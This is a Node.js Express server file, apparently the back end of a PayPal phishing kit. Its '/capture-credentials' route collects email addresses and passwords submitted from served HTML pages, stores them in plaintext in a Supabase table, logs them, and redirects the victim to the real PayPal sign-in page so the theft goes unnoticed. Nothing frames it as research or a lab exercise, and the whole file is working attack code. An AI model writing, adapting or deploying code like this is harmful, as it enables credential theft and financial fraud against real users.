require('dotenv').config(); // Load environment variables
const express = require('express');
const { createClient } = require('@supabase/supabase-js'); // Supabase client
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Supabase client using environment variables
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

// Middleware to parse incoming request bodies
app.use(express.urlencoded({ extended: true }));

// Serve static files from the "html" folder
app.use(express.static(path.join(__dirname, 'html')));

// Route to capture credentials
app.post('/capture-credentials', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            res.status(400).send('Email and password are required.');
            return;
        }

        // Save credentials to the Supabase database
        const { data, error } = await supabase
            .from('credentials') // Replace 'credentials' with your actual table name
            .insert([{ email, password }]);

        if (error) {
            console.error('Error saving credentials:', error);
            res.status(500).send('Failed to save credentials.');
            return;
        }

        console.log('Credentials saved:', data);
        res.redirect('https://www.paypal.com/signin'); // Redirect user
    } catch (err) {
        console.error('Unexpected error:', err);
        res.status(500).send('Unexpected error occurred.');
    }
});

// Default route to check server status
app.get('/', (req, res) => {
    res.send('Server is running!');
});

// Catch-all route for undefined paths
app.use((req, res) => {
    res.status(404).send('Page not found');
});

// Global error handling for unexpected errors
process.on('uncaughtException', (err) => {
    console.error('There was an uncaught error:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
